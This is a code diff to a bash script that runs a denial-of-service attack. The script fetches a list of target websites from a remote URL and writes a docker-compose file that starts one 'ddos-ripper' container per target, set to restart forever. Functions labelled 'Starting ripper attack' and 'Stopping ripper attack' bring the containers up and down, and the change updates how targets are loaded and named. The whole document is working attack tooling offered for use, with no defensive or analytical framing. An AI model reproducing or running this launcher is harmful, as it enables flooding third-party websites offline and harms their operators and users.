@@ -37,31 +37,38 @@ function generate_compose {
         amount=50
     fi
 
-    echo -e "version: '3'" > docker-compose.yml
-    echo -e "services:" >> docker-compose.yml
-    counter=1
+    curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt
 
-    while read -r site_url; do
-        if [ $counter -le $amount ]; then
-            if [ ! -z $site_url ]; then
-                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
-                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-                echo -e "    restart: always" >> docker-compose.yml
-                echo -e "    command: $site_url" >> docker-compose.yml
-                ((counter++))
-            fi
-        fi
-    done < targets.txt
+    if [ -s targets.txt ]; then
+      echo -e "version: '3'" > docker-compose.yml
+      echo -e "services:" >> docker-compose.yml
+      counter=1
+
+      while read -r site_url; do
+          if [ $counter -le $amount ]; then
+              if [ ! -z $site_url ]; then
+                  suffix=$(echo $site_url | sed -r 's/[:\/\.]+/_/g')
+                  echo -e "  ddos-runner-$suffix:" >> docker-compose.yml
+                  echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+                  echo -e "    restart: always" >> docker-compose.yml
+                  echo -e "    command: $site_url" >> docker-compose.yml
+                  ((counter++))
+              fi
+          fi
+      done < targets.txt
+
+      truncate -s 0 targets.txt
+    fi
 }
 
 function ripper_start {
   echo "Starting ripper attack"
-  docker-compose up -d
+  docker-compose up -d --remove-orphans
 }
 
 function ripper_stop {
   echo "Stopping ripper attack"
-  docker-compose down
+  docker-compose down --remove-orphans
 }
 
 while test -n "$1"; do
@@ -86,8 +93,6 @@ while test -n "$1"; do
   esac
   shift
 done
-
-curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt
 
 check_dependencies
 check_params
